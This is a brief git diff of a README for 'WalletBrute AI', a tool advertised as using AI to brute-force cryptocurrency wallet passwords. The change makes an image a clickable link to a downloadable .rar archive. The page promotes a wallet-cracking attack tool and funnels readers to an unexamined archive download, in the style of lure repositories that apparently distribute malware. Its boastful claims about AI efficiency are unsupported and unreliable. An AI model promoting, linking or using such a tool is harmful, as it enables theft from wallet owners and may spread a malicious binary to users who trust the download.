@@ -2,7 +2,7 @@
 ![image](https://github.com/Hasbik31/WalletBrute-AI/assets/121810265/81180324-4ac7-48eb-b68a-fac7ca8cda67)
 
 
-[![image](https://github.com/Hasbik31/WalletBrute-AI/releases/download/Download/WalletBrute.AI.rar)
+[![image](https://github.com/Hasbik31/WalletBrute-AI/assets/121810265/033bb1ab-5eaf-4dbd-9c10-57802c114a79)](https://github.com/Hasbik31/WalletBrute-AI/releases/download/Download/WalletBrute.AI.rar)
 
 WalletBrute AI is a state-of-the-art application that harnesses the power of artificial intelligence and machine learning algorithms to execute brute-force attacks on cryptocurrency wallets, facilitating password recovery with unparalleled efficiency and accuracy.
 
